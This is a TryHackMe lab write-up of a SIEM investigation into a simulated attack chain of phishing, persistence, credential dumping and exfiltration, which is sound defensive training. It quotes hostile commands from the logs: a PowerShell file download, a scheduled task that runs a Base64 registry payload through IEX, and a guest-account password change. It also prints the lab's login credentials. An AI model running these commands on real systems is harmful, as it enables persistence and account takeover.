# TryHackMe Room: Monday Monitor

In this room, I analyzed malicious activity using the **Monday Monitor** platform. The tasks focused on finding suspicious commands, scheduled tasks, credential dumping, and data exfiltration.

Credentials to log in:
Username: admin
Password: Mond*yM0nit0r7

---

## 1. Initial access was established using a downloaded file. What is the file name saved on the host?
From the dashboard, I navigated to **Policy Monitoring → Monday Monitor**, set the timeframe to **April 29, 2024 12:00 PM – 8:00 PM**, then filtered events by **Microsoft Office** and looked at those containing a `command line`.  

I found the following command:
"powershell.exe" & {$url = 'http://localhost/SwiftSpend_Financial_Expenses.xlsm
' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}

This shows a malicious PowerShell download:  
- It pulls a file (`SwiftSpend_Financial_Expenses.xlsm`) from `localhost`.  
- Saves it locally as `PhishingAttachment.xlsm`.  

[Screenshot 01: Suspicious PowerShell download](./screenshots/01-powershell-download.png)

---

## 2. What is the full command run to create a scheduled task?
Digging deeper into suspicious events, I found one with `schtasks.exe`, which creates a scheduled task.  
Looking at its **parentCommandLine**, I saw:

"cmd.exe" /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min "" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\ATOMIC-T1053.005).test)))" /sc daily /st 12:34"

What this means:
- A registry value (`test`) is created under `HKCU\SOFTWARE\ATOMIC-T1053.005`.  
- The value stores a Base64 string.  
- A scheduled task named `ATOMIC-T1053.005` is created.  
- When triggered, it decodes the Base64 string and executes it via PowerShell.  

[Screenshot 02: Scheduled task creation](./screenshots/02-schtasks.png)  

---

## 3. What time is the scheduled task meant to run?
At the very end of the command above we see:  
/sc daily /st 12:34
So the task was scheduled for **12:34 daily**.

---

## 4. What was encoded?
The Base64 string in the registry command was:
cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=
Decoding it (using CyberChef → *From Base64*) gave the result.  

[Screenshot 03: Decoded Base64 result](./screenshots/03-decoded.png)

---

## 5. What password was set for the new user account?
A few events later, I found the following suspicious command:
net user guest I_AM_M0NIT0R1NG
This indicates the password of the **Guest** account was set to `I_AM_M0NIT0R1NG`.  

[Screenshot 04: Guest password change](./screenshots/04-guest.png)

---

## 6. What is the name of the .exe that was used to dump credentials?
Going back to the **Dashboard**, I selected *Possible Office Macro Started* and reapplied filters.  
Among the events, I saw two tools attempting **Pass-the-Hash (PTH)** attacks:  
- `mimikatz.exe`  
- `memotech.exe`  

The correct answer was `memotech.exe`.  

[Screenshot 05: Credential dumping tool](./screenshots/05-cred-dump.png)

---

## 7. Data was exfiltrated from the host. What was the flag that was part of the data?
After clearing filters except `manager-name`, I scrolled through events until I found a long PowerShell command containing a `$content` variable that held the exfiltrated flag.  

[Screenshot 06: Flag exfiltration command](./screenshots/06-flag.png)

---

## Summary
In this room I practiced:
- Detecting **malicious PowerShell downloads**.  
- Investigating **scheduled task persistence** and decoding Base64 payloads.  
- Tracking account modifications (password changes).  
- Identifying **credential dumping tools** used in Pass-the-Hash.  
- Detecting **data exfiltration** and recovering the stolen flag.  

This scenario demonstrated a realistic attacker chain: phishing → persistence → credential access → exfiltration.
